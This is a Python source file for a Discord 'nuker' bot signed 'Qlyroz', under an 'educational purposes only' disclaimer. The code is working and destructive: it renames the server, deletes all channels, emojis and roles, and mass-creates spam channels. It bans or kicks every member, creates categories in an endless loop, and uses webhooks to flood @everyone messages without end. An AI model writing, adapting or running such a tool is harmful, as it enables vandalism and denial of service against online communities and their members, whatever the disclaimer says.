
# This bot is for educational purposes only. Please use it responsibly and only on servers where you have explicit permission.
# Unauthorized or malicious use of this bot may lead to bans or legal consequences.

import os
import discord
from discord.ext import commands
import random
import asyncio

CHANNEL_NAMES = [
    "nuked-by-qlyroz", "nuked-by-qlyroz", "nuked-by-qlyroz"
]
SPAM_MESSAGE = [
    "@everyone This server has been restructured", "@everyone QLYROZ OWNS YOU!",
    "@everyone JOIN THE QLYROZ ARMY"
]
WEBHOOK_NAMES = [
    'uppa', 'friend', 'random', 'rocket', 'cleaner', 'admin', 'helper'
]
ascii_art = r'''
 __   __  ____     ___  ____   __    ___  __ _  ____  ____  ____ 

            MADE BY Qlyroz :3
'''
red_color = "\033[91m"
reset_color = "\033[0m"

intents = discord.Intents.all()
client = commands.Bot(command_prefix=".", intents=intents)

@client.event
async def on_ready():
    print(red_color + ascii_art + reset_color +
          f"Logged in as {client.user}")

@client.command()
async def nuke(ctx, amount=500):
    await ctx.message.delete()
    await ctx.guild.edit(name="<<QLYROZ OWNS YOU>>")
    guild = ctx.guild
  
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass
    
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
        except:
            pass
    
    for i in range(amount):
        try:
            await ctx.guild.create_text_channel(random.choice(CHANNEL_NAMES))
        except:
            pass
          
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except:
            pass
          
    for member in ctx.guild.members:
        try:
            await member.ban(reason="Cleanup in progress")
        except:
            pass

@client.command()
async def kickall(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.kick(reason="Cleanup in progress")
        except:
            pass

@client.command()
@commands.is_owner()
async def online(ctx):
    await client.change_presence(status=discord.Status.online)
    await ctx.message.delete()

@client.command()
@commands.is_owner()
async def offline(ctx):
    await client.change_presence(status=discord.Status.offline)
    await ctx.message.delete()

@client.command()
async def spamcat(ctx):
    await ctx.message.delete()
    while True:
        try:
            await ctx.guild.create_category(name="QLYROZ OWNS YOU")
        except:
            pass

@client.command()
async def banall(ctx):
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.ban(reason="Cleanup in progress")
        except:
            pass

@client.event
async def on_guild_channel_create(channel):
    webhook = await channel.create_webhook(name=random.choice(WEBHOOK_NAMES))
    while True:
        await channel.send(random.choice(SPAM_MESSAGE))
        await webhook.send(random.choice(SPAM_MESSAGE),
                           username=random.choice(WEBHOOK_NAMES))

token = ("YOUR_BOT_TOKEN")
client.run(token)
